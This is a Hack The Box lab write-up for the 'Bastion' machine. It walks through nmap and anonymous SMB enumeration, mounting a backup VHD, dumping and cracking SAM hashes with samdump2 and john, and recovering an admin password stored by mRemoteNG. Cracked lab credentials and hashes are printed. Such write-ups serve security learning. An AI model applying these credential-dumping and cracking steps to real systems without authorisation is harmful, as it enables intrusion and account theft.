# bastion.htb
### Write-up for the bastion machine from hackthebox

<img width="292" alt="Screen Shot 2019-07-29 at 1 49 06 PM" src="https://user-images.githubusercontent.com/46615118/62074159-bd2f0000-b207-11e9-9a21-0a3f64b2cb37.png">

I learned a lot on this box. Mounting an SMB share and enumerating its contents reveals a virtual hard disk that you need to either figure out how to mount or open in a VM. I chose to mount via kali. Once mounted, you can get user creds using samdump2. You are then able to ssh into the box and begin enumerating for privesc. In your enumeration, you'll find a application that insecurely stores passwords. If you didn't spin up a VM earlier, you'll have to do it now. This will get you admin creds and root.

### Scan and Basic Recon

I began with a safe script and version scan with nmap

```
nmap -sV -sC -oN tcp.nmap 10.10.10.134

Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-03 15:21 CDT
Nmap scan report for 10.10.10.134
Host is up (0.14s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-05-03T22:22:17+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-05-03 15:22:16
|_  start_date: 2019-05-03 14:40:05

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.25 seconds
```

Neat! No web servers so far, and anonymous access to SMB enabled. I ran `smbmap -u anonymous -H 10.10.10.134` and got the following output.

```
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.134...
[+] IP: 10.10.10.134:445	Name: 10.10.10.134                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	Backups                                           	READ, WRITE
	[!] Unable to remove test directory at \\10.10.10.134\Backups\CMmGdHrWob, plreae remove manually
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
```

Taking a peek into the `Backups` share with `smbclient` shows many things to investigate. I could file transfer to my local machine, but that seems a bit excessive, especially with some files in the share that are larger than 5GB. Let's try mounting the share. I first made a mount point in `/mnt`.

`mkdir /mnt/smb`

and then ran

`mount.cifs //10.10.10.134/Backups /mnt/smb`

Success! Let's rummage through here and see what we can find. That 5GB file I mentioned earlier is a virtual hard drive. I'd like to see what's on it. I could open it in a VM, but hey we've been mounting successfully so far and ~my computer is crap and likely wont't be able to handle the load of a VM~ I'm feeling lucky.

After much research, I saw that I could use `guestmount` from [libguestfs-tools](http://libguestfs.org/guestmount.1.html). After installing `libguestfs-tools` I ran

`guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt/vhd/`

The drive name following the `-a` is what will be mounted. `-i` inspects the disk looking for an operating system and mounts the filesystem as it would be mounted on the real virtual machine. `--ro` mounts the drive in read only mode. It gave me the below output.

![Screenshot from 2019-07-25 22-23-45](https://user-images.githubusercontent.com/46615118/61970965-780a9400-afa3-11e9-825d-fa6189a01135.jpg)

### Gaining Access

On Windows, the Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. SAM passwords are stored as a LM hash or as a NTLM hash. This file can be found in `%SystemRoot%/system32/config/SAM`.

I used `samdump2` to extract the hashes from the SAM db.

![Screenshot from 2019-07-25 22-37-43](https://user-images.githubusercontent.com/46615118/61974849-2d8e1500-afad-11e9-908f-daf4ea2f346b.jpg)

I then ran `john` against the hashes, using `rockyou.txt` as the wordlist

`john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`

and this gave me creds for the user `L4mpje`:

```
john --show --format=NT ~/Desktop/hashes.txt 
*disabled* Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:bureaulampje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
Looking back at our nmap output we see that ssh is available. I try `ssh L4mpje@10.10.10.134` and enter the password, and we're in and can get `user.txt`!

![Screenshot from 2019-07-25 22-46-24 (1)](https://user-images.githubusercontent.com/46615118/61975322-6e3a5e00-afae-11e9-9e77-e4cff510e912.jpg)

### Privesc and Pwn

Next I need to enumerate to find a path to privesc. A reasonable start would be to [look at the programs that the user installed](https://www.howtogeek.com/165293/how-to-get-a-list-of-software-installed-on-your-pc-with-a-single-command/) on the machine. I ran the following powershell to find installed software on the machine.

```Powershell
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallDate
```
This returns the following:

![Screenshot from 2019-07-27 13-59-31](https://user-images.githubusercontent.com/46615118/61999282-1a4d7900-b083-11e9-9160-e9cabda87dbb.jpg)

We'll focus first on mRemoteNG. Searchsploit has nothing, but google searching returns [this article](http://hackersvanguard.com/mremoteng-insecure-password-storage/). In reading the article, we see that the author has figured out a way to dump passwords stored in the app by editing the connections configuration file, which is by default named `confCons.xml`. 

So, it looks like I'll have to spin up a VM and install the app to follow the author's lead. Let's grab L4mpje's `confCons.xml` before we mess with the VM. I'll use `scp`.

![Screenshot from 2019-07-27 14-50-03](https://user-images.githubusercontent.com/46615118/61999280-16b9f200-b083-11e9-883b-340a1c946598.jpg)

I spun up a Windows VM (windows 10, 64-bit, build WinDev1903Eval worked for me) and installed mRemoteNG. I replaced the stock config file with L4mpje's, and ran the program. It took a while to figure out that I only needed to expose the Admin password and not rewrite the `Protected` string mentioned at the beginning of the article. We already have the access we need. I created a new external tool as mentioned in the article. I followed the next steps and was able to leak the Admin password.

![Screenshot from 2019-05-23 15-45-18](https://user-images.githubusercontent.com/46615118/61974304-d5a2de80-afab-11e9-81f8-54f9a3bc92e4.jpg)

I ssh'd in with the admin creds and entered the password. I then navigated to the desktop and pillaged root.txt. 

![Screenshot from 2019-07-27 14-52-27](https://user-images.githubusercontent.com/46615118/61999279-14f02e80-b083-11e9-8bce-175663cad0ba.jpg)

~fin!

### Lessons Learned
- I did this box a while back and my note taking was poor, thus:

   - I don't remember how I figured out that the version of mRemoteNG on the box was vulnerable to the attack.
   - I don't remember how I figured out the SAM file was accessable.

- I am working on a better methodology for taking notes. Siginificant progress will be seen in the Craft and RE box write-ups. 

<img width="544" alt="Screen Shot 2019-07-29 at 1 51 53 PM" src="https://user-images.githubusercontent.com/46615118/62074302-126b1180-b208-11e9-8e3e-e47b008e8aae.png">

<img width="544" alt="Screen Shot 2019-07-29 at 1 51 30 PM" src="https://user-images.githubusercontent.com/46615118/62074301-126b1180-b208-11e9-828f-8534496dc235.png">
